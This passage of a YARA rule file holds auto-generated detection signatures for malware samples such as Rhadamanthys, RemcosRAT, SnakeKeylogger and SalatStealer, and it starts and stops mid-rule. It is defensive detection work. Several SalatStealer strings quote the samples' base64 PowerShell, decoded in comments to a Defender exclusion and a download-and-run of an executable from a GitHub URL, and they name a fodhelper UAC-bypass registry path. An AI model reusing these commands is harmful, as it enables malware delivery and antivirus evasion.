      $s2 = "-Controls\" version=\"6.0.0.0\" processorArchitecture=\"X86\" publicKeyToken=\"6595b64144ccf1df\"></assemblyIdentity></dependent" ascii /* score: '25.00'*/
      $s3 = "y></dependency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel lev" ascii /* score: '22.00'*/
      $s4 = "=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivileges></security></trustInfo></assembly>" fullword ascii /* score: '19.00'*/
      $s5 = "7ZSfxMod_x86.exe" fullword wide /* score: '19.00'*/
      $s6 = "InstallPath=\"%TEMP%\"" fullword ascii /* score: '15.00'*/
      $s7 = "Error in command line:" fullword ascii /* score: '15.00'*/
      $s8 = "RunProgram=\"\\\"%%T\\\\Vector-Neur.exe\\\"\"" fullword ascii /* score: '14.00'*/
      $s9 = " \"setup.exe\" " fullword ascii /* score: '11.00'*/
      $s10 = "* PwAy" fullword ascii /* score: '9.00'*/
      $s11 = "ExtractDialogText=\"\"" fullword ascii /* score: '9.00'*/
      $s12 = "* Zhq<" fullword ascii /* score: '9.00'*/
      $s13 = "\\hqAa- 26" fullword ascii /* score: '9.00'*/
      $s14 = "!Require Windows" fullword ascii /* PEStudio Blacklist: strings */ /* score: '9.00'*/
      $s15 = "ebznqzy" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      1 of ($x*) and 4 of them
}

rule Rhadamanthys_signature__b5a014d7eeb4c2042897567e1288a095_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_b5a014d7eeb4c2042897567e1288a095(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a28f0d6f256a59994cbfef8b83c9ce8d8fef795a0e4c7dbe43638e8e383a3377"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity version=\"1.4.0.1794\" name=\"7-Z" ascii /* score: '45.00'*/
      $s2 = "-Controls\" version=\"6.0.0.0\" processorArchitecture=\"X86\" publicKeyToken=\"6595b64144ccf1df\"></assemblyIdentity></dependent" ascii /* score: '25.00'*/
      $s3 = "y></dependency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel lev" ascii /* score: '22.00'*/
      $s4 = "=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivileges></security></trustInfo></assembly>" fullword ascii /* score: '19.00'*/
      $s5 = "7ZSfxMod_x86.exe" fullword wide /* score: '19.00'*/
      $s6 = "InstallPath=\"%TEMP%\"" fullword ascii /* score: '15.00'*/
      $s7 = "Error in command line:" fullword ascii /* score: '15.00'*/
      $s8 = "1PTtnTERe" fullword ascii /* base64 encoded string '=;gLD^' */ /* score: '14.00'*/
      $s9 = "RunProgram=\"\\\"%%T\\\\Navigator-Hyper.exe\\\"\"" fullword ascii /* score: '14.00'*/
      $s10 = "* /um}t" fullword ascii /* score: '13.00'*/
      $s11 = " \"setup.exe\" " fullword ascii /* score: '11.00'*/
      $s12 = "){dUMp" fullword ascii /* score: '11.00'*/
      $s13 = "ExtractDialogText=\"\"" fullword ascii /* score: '9.00'*/
      $s14 = "!Require Windows" fullword ascii /* PEStudio Blacklist: strings */ /* score: '9.00'*/
      $s15 = "6~#[ #`-C" fullword ascii /* score: '9.00'*/ /* hex encoded string 'l' */
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      1 of ($x*) and 4 of them
}

rule Rhadamanthys_signature__f6baa5eaa8231d4fe8e922a2e6d240ea_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_f6baa5eaa8231d4fe8e922a2e6d240ea(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4e91b243cf07e7e0e6b369a9af64a499823f6c8d11cdd9f8b1a266c1474cc952"
   strings:
      $x1 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"X86\" pu" ascii /* score: '32.00'*/
      $s2 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"X86\" pu" ascii /* score: '29.00'*/
      $s3 = "RunProgram=\"%%P:hidcon:\\\"main.bat\\\" /S\"" fullword ascii /* score: '24.00'*/
      $s4 = "<requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivil" ascii /* score: '23.00'*/
      $s5 = "<requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivil" ascii /* score: '23.00'*/
      $s6 = "sfxelevation" fullword wide /* score: '20.00'*/
      $s7 = "PreExtract=\"%%P:hidcon:cmd /c \\\"\\\"%%T\\\\KillDuplicate.cmd\\\" \\\"%%T\\\" \\\"%%M\\\"\\\"\"" fullword ascii /* score: '16.00'*/
      $s8 = "YC.exe" fullword wide /* score: '16.00'*/
      $s9 = "Error in command line:" fullword ascii /* score: '15.00'*/
      $s10 = "InstallPath=\"%Temp%\\\\main\"" fullword ascii /* score: '15.00'*/
      $s11 = " - Copyright (c) 2005-2012 " fullword ascii /* score: '14.00'*/
      $s12 = "SFX module - Copyright (c) 2005-2012 Oleg Scherbakov" fullword ascii /* score: '14.00'*/
      $s13 = " 7-Zip - Copyright (c) 1999-2011 " fullword ascii /* score: '14.00'*/
      $s14 = "7-Zip archiver - Copyright (c) 1999-2011 Igor Pavlov" fullword ascii /* score: '14.00'*/
      $s15 = "7zSfxVarSystemPlatform" fullword wide /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__9151f8c3 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9151f8c3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9151f8c3b1a24fdd94d2787da6df89bc590d32e20fe5485dc6032ca7384747e6"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "NCryptSharp.SCryptSubset, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '28.00'*/
      $s3 = "questedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\"><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" /><" ascii /* score: '26.00'*/
      $s4 = "83031752990.exe" fullword wide /* score: '19.00'*/
      $s5 = "I83031752990, Version=1.0.3523.10739, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s6 = "<assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\" /><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\"><securi" ascii /* score: '14.00'*/
      $s7 = ".NET Framework 4.5l" fullword ascii /* score: '10.00'*/
      $s8 = "fefeffeefa" ascii /* score: '8.00'*/
      $s9 = "afeffefefe" ascii /* score: '8.00'*/
      $s10 = "ffeeffefe" ascii /* score: '8.00'*/
      $s11 = "fefeffeefef" ascii /* score: '8.00'*/
      $s12 = "feffeefefa" ascii /* score: '8.00'*/
      $s13 = "fefefeffeef" ascii /* score: '8.00'*/
      $s14 = "ffeeffefefe" ascii /* score: '8.00'*/
      $s15 = "feffeefeffe" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__a1c82397 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a1c82397.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a1c82397ee529114e6d388f9fd658fbb2cefd2e4324576c637189aeba1ead526"
   strings:
      $s1 = "NCryptSharp.SCryptSubset, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '28.00'*/
      $s2 = "Xxuorxzdhr.Execution" fullword ascii /* score: '23.00'*/
      $s3 = "Xxuorxzdhr.exe" fullword wide /* score: '22.00'*/
      $s4 = "ExecutorToken" fullword ascii /* score: '19.00'*/
      $s5 = "connectionExecutor" fullword ascii /* score: '19.00'*/
      $s6 = "ExecuteMapper" fullword ascii /* score: '18.00'*/
      $s7 = "ExecuteScheduledExecutor" fullword ascii /* score: '18.00'*/
      $s8 = "HXxuorxzdhr, Version=1.0.3403.11294, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s9 = "m_SetExecutor" fullword ascii /* score: '16.00'*/
      $s10 = "GuideExecutor" fullword ascii /* score: '16.00'*/
      $s11 = "StopActiveExecutor" fullword ascii /* score: '16.00'*/
      $s12 = "DividedExecutor" fullword ascii /* score: '16.00'*/
      $s13 = "RunLiteralExecutor" fullword ascii /* score: '16.00'*/
      $s14 = "SortExecutor" fullword ascii /* score: '16.00'*/
      $s15 = "RunSeparatedExecutor" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__26a27143 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_26a27143.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "26a2714342c817548962d1a9cf5ebb1aacb811c3060fea1269c8280047b8eddf"
   strings:
      $s1 = "fdpU.exe" fullword wide /* score: '22.00'*/
      $s2 = "fdpU.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "get_DigitalRoot" fullword ascii /* score: '12.00'*/
      $s4 = "GetDigitalRoot" fullword ascii /* score: '12.00'*/
      $s5 = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*" fullword wide /* score: '11.00'*/
      $s6 = "Primes_{0}_{1}.txt" fullword wide /* score: '11.00'*/
      $s7 = "Built with .NET Framework 4.0" fullword wide /* score: '10.00'*/
      $s8 = "get_IsPrime" fullword ascii /* score: '9.00'*/
      $s9 = "get_FactorCount" fullword ascii /* score: '9.00'*/
      $s10 = "GetPrimeFactorization" fullword ascii /* score: '9.00'*/
      $s11 = "<GetPrimesWithDigitSum>b__0" fullword ascii /* score: '9.00'*/
      $s12 = "get_IsPalindromic" fullword ascii /* score: '9.00'*/
      $s13 = "get_IsArmstrong" fullword ascii /* score: '9.00'*/
      $s14 = "get_IsDeficient" fullword ascii /* score: '9.00'*/
      $s15 = "get_PrimeFactors" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__cf473160 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_cf473160.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cf473160304d369b5b254d3b32299767da9d51b1e9e8c726d65c08ed1f2a136b"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\LqmqQRJqIr\\src\\obj\\Debug\\UXIS.pdb" fullword ascii /* score: '40.00'*/
      $s2 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s3 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s4 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD~" fullword ascii /* score: '27.00'*/
      $s5 = "get_loginError" fullword ascii /* score: '23.00'*/
      $s6 = "UXIS.exe" fullword wide /* score: '22.00'*/
      $s7 = "get_loginAfter" fullword ascii /* score: '20.00'*/
      $s8 = "loginError" fullword wide /* score: '18.00'*/
      $s9 = "MMMMMMO" fullword ascii /* reversed goodware string 'OMMMMMM' */ /* score: '16.50'*/
      $s10 = "loginAfter" fullword wide /* score: '15.00'*/
      $s11 = "get_Fitness" fullword ascii /* score: '9.00'*/
      $s12 = "* Z,DWB.r" fullword ascii /* score: '9.00'*/
      $s13 = "waycount" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule Rhadamanthys_signature__d47105e79f5c0c9284c6762e9f8cc1ad_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_d47105e79f5c0c9284c6762e9f8cc1ad(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1bc96921149b3309dd3bb9f9512907a84657d681fab1da28abfa058b3f281a08"
   strings:
      $x1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" wide /* base64 encoded string '                       ' */ /* reversed goodware string 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' */ /* score: '38.50'*/
      $s2 = "icuuc69.dll" fullword wide /* score: '23.00'*/
      $s3 = "icudt69.dll" fullword ascii /* score: '23.00'*/
      $s4 = "?getMutex@UMutex@icu_69_plex@@AAEPAVmutex@std@@XZ" fullword ascii /* score: '20.00'*/
      $s5 = "?gListHead@UMutex@icu_69_plex@@0PAV12@A" fullword ascii /* score: '20.00'*/
      $s6 = "ubidi_getProcessedLength_69_plex" fullword ascii /* score: '20.00'*/
      $s7 = "uscript_getUsage_69_plex" fullword ascii /* score: '20.00'*/
      $s8 = "?compare_exchange_strong@?$atomic@PAVmutex@std@@@std@@QCE_NAAPAVmutex@2@QAV32@W4memory_order@2@@Z" fullword ascii /* score: '18.00'*/
      $s9 = "?getSupportedIDs@ICUResourceBundleFactory@icu_69_plex@@MBEPBVHashtable@2@AAW4UErrorCode@@@Z" fullword ascii /* score: '18.00'*/
      $s10 = "?getKey@ICUService@icu_69_plex@@QBEPAVUObject@2@AAVICUServiceKey@2@AAW4UErrorCode@@@Z" fullword ascii /* score: '18.00'*/
      $s11 = "?compare_exchange_weak@?$atomic@PAVmutex@std@@@std@@QCE_NAAPAVmutex@2@QAV32@W4memory_order@2@2@Z" fullword ascii /* score: '18.00'*/
      $s12 = "?getKey@ICUService@icu_69_plex@@QBEPAVUObject@2@AAVICUServiceKey@2@PAVUnicodeString@2@PBVICUServiceFactory@2@AAW4UErrorCode@@@Z" fullword ascii /* score: '18.00'*/
      $s13 = "?getVisibleIDs@ICUService@icu_69_plex@@QBEAAVUVector@2@AAV32@AAW4UErrorCode@@@Z" fullword ascii /* score: '18.00'*/
      $s14 = "?get@ICUService@icu_69_plex@@QBEPAVUObject@2@ABVUnicodeString@2@AAW4UErrorCode@@@Z" fullword ascii /* score: '18.00'*/
      $s15 = "?compare_exchange_strong@?$_Atomic_storage@PAVmutex@std@@$03@std@@QAE_NAAPAVmutex@2@QAV32@W4memory_order@2@@Z" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and 4 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4e59c60c {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4e59c60c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4e59c60c8ce4d441d9c5dc4fa1b4e510aaec47ce44a0b862ec00cd739a9b8e14"
   strings:
      $s1 = "ASau.exe" fullword wide /* score: '22.00'*/
      $s2 = "https://github.com/textmerger" fullword wide /* score: '17.00'*/
      $s3 = "Processor Count: {0}" fullword wide /* score: '17.00'*/
      $s4 = "TextProcessor" fullword ascii /* score: '15.00'*/
      $s5 = "groupBoxProcessing" fullword wide /* score: '15.00'*/
      $s6 = "textProcessor" fullword ascii /* score: '15.00'*/
      $s7 = "Text Processing Options" fullword wide /* score: '15.00'*/
      $s8 = ".NET Framework: 4.0.0.0" fullword wide /* score: '15.00'*/
      $s9 = "targetEncoding" fullword ascii /* score: '14.00'*/
      $s10 = "ASau.pdb" fullword ascii /* score: '14.00'*/
      $s11 = "merged.txt" fullword wide /* score: '14.00'*/
      $s12 = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*" fullword wide /* score: '11.00'*/
      $s13 = "A Windows Forms application for merging multiple text files with customizable separators and processing options." fullword wide /* score: '11.00'*/
      $s14 = "Preview Merged Content" fullword wide /* score: '11.00'*/
      $s15 = ".NET Framework: {0}" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__bd9e0807 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_bd9e0807.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bd9e08075d83ae69399f6c11bbf50729cab0cff666754b1b015b26ca5030324d"
   strings:
      $s1 = "EiH.exe" fullword wide /* score: '19.00'*/
      $s2 = "IronWardenProcess" fullword ascii /* score: '15.00'*/
      $s3 = ".NET Framework 4.5<" fullword ascii /* score: '10.00'*/
      $s4 = "ghostNumber" fullword ascii /* score: '9.00'*/
      $s5 = "get_yuksekSkor" fullword ascii /* score: '9.00'*/
      $s6 = "bizimaraba" fullword ascii /* score: '8.00'*/
      $s7 = "shvevba" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule RustyStealer_signature__6170eb509edf6f256d874ec9ac2efc43_imphash_ {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_6170eb509edf6f256d874ec9ac2efc43(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "40b0fa31dacf38f3dd555661ccada21748fb012b3f70b0e44cc3d4dc1429d548"
   strings:
      $x1 = "bcryptprimitives.dll" fullword ascii /* reversed goodware string 'lld.sevitimirptpyrcb' */ /* score: '33.00'*/
      $s2 = "#$*+-./:?@\\_cmd.exe /e:ON /v:OFF /d /c \"f" fullword ascii /* score: '28.00'*/
      $s3 = "NotFoundPermissionDeniedConnectionRefusedConnectionResetHostUnreachableNetworkUnreachableConnectionAbortedNotConnectedAddrInUseA" ascii /* score: '27.00'*/
      $s4 = "entity not foundpermission deniedconnection refusedconnection resethost unreachablenetwork unreachableconnection abortednot conn" ascii /* score: '27.00'*/
      $s5 = "C:\\Users\\Hnkasv'\\.rustup\\toolchains\\stable-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\std\\src\\io\\mod.rsp" fullword ascii /* score: '27.00'*/
      $s6 = "C:\\Users\\Hnkasv'\\.rustup\\toolchains\\stable-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\std\\src\\thread\\local.r" ascii /* score: '26.00'*/
      $s7 = "cmd.exe/c" fullword ascii /* score: '25.00'*/
      $s8 = "C:\\Users\\Hnkasv'\\.rustup\\toolchains\\stable-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\alloc\\src\\boxed.rs" fullword ascii /* score: '24.00'*/
      $s9 = "C:\\Users\\Hnkasv'\\.rustup\\toolchains\\stable-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\alloc\\src\\raw_vec.rs" fullword ascii /* score: '24.00'*/
      $s10 = "Errorgetrandom: this target is not supportederrno: did not return a positive valueunexpected situationSecRandomCopyBytes: iOS Se" ascii /* score: '24.00'*/
      $s11 = "C:\\Users\\Hnkasv'\\.rustup\\toolchains\\stable-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\alloc\\src\\collections" ascii /* score: '24.00'*/
      $s12 = "C:\\Users\\Hnkasv'\\.rustup\\toolchains\\stable-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\alloc\\src\\slice.rs" fullword ascii /* score: '24.00'*/
      $s13 = "C:\\Users\\Hnkasv'\\.rustup\\toolchains\\stable-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\alloc\\src\\collections" ascii /* score: '24.00'*/
      $s14 = "C:\\Users\\Hnkasv'\\.rustup\\toolchains\\stable-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\std\\src\\io\\mod.rs" fullword ascii /* score: '24.00'*/
      $s15 = "C:\\Users\\Hnkasv'\\.rustup\\toolchains\\stable-x86_64-pc-windows-msvc\\lib/rustlib/src/rust\\library\\core\\src\\iter\\traits" ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      1 of ($x*) and 4 of them
}

rule SalatStealer_signature__63c558c25deb865d330acf0806bd66bf_imphash_ {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_63c558c25deb865d330acf0806bd66bf(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1cb9a68770a0018a66d62e992b36f3fab2539f70266af33c733537088e8615e8"
   strings:
      $x1 = "powershell -ExecutionPolicy Bypass -EncodedCommand %s" fullword ascii /* score: '46.00'*/
      $x2 = "cmd.exe /c START \"\" \"" fullword wide /* score: '39.00'*/
      $x3 = "C:\\Users\\Void\\Desktop\\gg\\Project1\\x64\\Release\\Project1.pdb" fullword ascii /* score: '33.00'*/
      $s4 = "\\System32\\fodhelper.exe" fullword wide /* score: '24.00'*/
      $s5 = "ZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcwBhAG0AbgBpAG4AagBhADYANgA2AC8AdABlAHMAdAAyADIAOAAvAHIAYQB3AC8A" ascii /* base64 encoded string 'e s t   " h t t p s : / / g i t h u b . c o m / s a m n i n j a 6 6 6 / t e s t 2 2 8 / r a w / ' */ /* score: '21.00'*/
      $s6 = "QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEA" ascii /* base64 encoded string 'A d d - M p P r e f e r e n c e   - E x c l u s i o n P a t h   " $ e n v : L O C A L A P P D A ' */ /* score: '21.00'*/
      $s7 = "bABlAHoAaQBsAGEAMwAyAC4AZQB4AGUAIgAgAC0AVgBhAGwAdQBlACAAIgAkAGUAbgB2ADoATABPAEMAQQBMAEEAUABQAEQAQQBUAEEAXABUAGUAbQBwAFwAZgBpAGwA" ascii /* base64 encoded string 'l e z i l a 3 2 . e x e "   - V a l u e   " $ e n v : L O C A L A P P D A T A \ T e m p \ f i l ' */ /* score: '17.00'*/
      $s8 = "IgBIAEsAQwBVADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4A" ascii /* base64 encoded string '" H K C U : \ S o f t w a r e \ M i c r o s o f t \ W i n d o w s \ C u r r e n t V e r s i o n ' */ /* score: '17.00'*/
      $s9 = "cgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBmAGkAbABlAHoAaQBsAGEAMwAyAC4AZQB4AGUAIAAiACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoA" ascii /* base64 encoded string 'r e f s / h e a d s / m a i n / f i l e z i l a 3 2 . e x e   "   - O u t F i l e   " $ e n v : ' */ /* score: '17.00'*/
      $s10 = "Software\\Classes\\ms-settings\\shell\\open\\command" fullword wide /* score: '13.00'*/
      $s11 = "ZQB6AGkAbABhADMAMgAuAGUAeABlACIAIAAtAFQAeQBwAGUAIABTAHQAcgBpAG4AZwANAAoAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAJABlAG4AdgA6AEwA" ascii /* score: '11.00'*/
      $s12 = "TwBDAEEATABBAFAAUABEAEEAVABBAFwAVABlAG0AcABcAGYAaQBsAGUAegBpAGwAYQAzADIALgBlAHgAZQAiAA==" fullword ascii /* base64 encoded string 'O C A L A P P D A T A \ T e m p \ f i l e z i l a 3 2 . e x e " ' */ /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      1 of ($x*) and all of them
}

rule SalatStealer_signature__971afde26a9678b597aba00403978dd9_imphash_ {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_971afde26a9678b597aba00403978dd9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4e149c61cb0da1f933e20293778868a1c80d91255d9eb09192f5462d1513ae72"
   strings:
      $x1 = "powershell -ExecutionPolicy Bypass -EncodedCommand %s" fullword ascii /* score: '46.00'*/
      $x2 = "C:\\Users\\Void\\Desktop\\gg\\Project1\\x64\\Release\\Project1.pdb" fullword ascii /* score: '33.00'*/
      $s3 = "QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEA" ascii /* base64 encoded string 'A d d - M p P r e f e r e n c e   - E x c l u s i o n P a t h   " $ e n v : L O C A L A P P D A ' */ /* score: '21.00'*/
      $s4 = "cwBhAG0AbgBpAG4AagBhADYANgA2AC8AbABhAHMAdAAvAHIAYQB3AC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBzAHkAcwB0AGUAbQBtAGEAaQBsADMA" ascii /* base64 encoded string 's a m n i n j a 6 6 6 / l a s t / r a w / r e f s / h e a d s / m a i n / s y s t e m m a i l 3 ' */ /* score: '21.00'*/
      $s5 = "VABBAFwAVABlAG0AcAAiADsAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8A" ascii /* base64 encoded string 'T A \ T e m p " ;   I n v o k e - W e b R e q u e s t   " h t t p s : / / g i t h u b . c o m / ' */ /* score: '17.00'*/
      $s6 = "cwB0AGUAbQAzADIALgBlAHgAZQAiADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAIgAkAGUAbgB2ADoATABPAEMAQQBMAEEAUABQAEQAQQBUAEEAXABUAGUA" ascii /* base64 encoded string 's t e m 3 2 . e x e " ;   S t a r t - P r o c e s s   " $ e n v : L O C A L A P P D A T A \ T e ' */ /* score: '17.00'*/
      $s7 = "MgAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiACQAZQBuAHYAOgBMAE8AQwBBAEwAQQBQAFAARABBAFQAQQBcAFQAZQBtAHAAXAB3AGkAbgBkAG8AdwBzAHkA" ascii /* base64 encoded string '2 . e x e "   - O u t F i l e   " $ e n v : L O C A L A P P D A T A \ T e m p \ w i n d o w s y ' */ /* score: '17.00'*/
      $s8 = "QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEA" ascii /* base64 encoded string 'A d d - M p P r e f e r e n c e   - E x c l u s i o n P a t h   " $ e n v : L O C A L A P P D A T A \ T e m p " ;   I n v o k e - W e b R e q u e s t   " h t t p s : / / g i t h u b . c o m / s a m n i n j a 6 6 6 / l a s t / r a w / r e f s / h e a d s / m a i n / s y s t e m m a i l 3 2 . e x e "   - O u t F i l e   " $ e n v : L O C A L A P P D A T A \ T e m p \ w i n d o w s y s t e m 3 2 . e x e " ;   S t a r t - P r o c e s s   " $ e n v : L O C A L A P P D A T A \ T e m p \ w i n d o w s y s t e m 3 2 . e x e " ' */ /* score: '17.00'*/
      $s9 = "\\fodhelper.exe" fullword wide /* score: '16.00'*/
      $s10 = "gSoftware\\Classes\\ms-settings\\shell\\open\\command" fullword wide /* score: '13.00'*/
      $s11 = "bQBwAFwAdwBpAG4AZABvAHcAcwB5AHMAdABlAG0AMwAyAC4AZQB4AGUAIgA=" fullword ascii /* base64 encoded string 'm p \ w i n d o w s y s t e m 3 2 . e x e " ' */ /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__cabce955 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_cabce955.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cabce955d78a0d271591f2bd6b7d28ac9fd7b740882cb90e12b49f5335869e13"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADx&y" fullword ascii /* score: '27.00'*/
      $s2 = "oJI.exe" fullword wide /* score: '19.00'*/
      $s3 = "IronWardenProcess" fullword ascii /* score: '15.00'*/
      $s4 = "\\getfunky.wav" fullword wide /* score: '13.00'*/
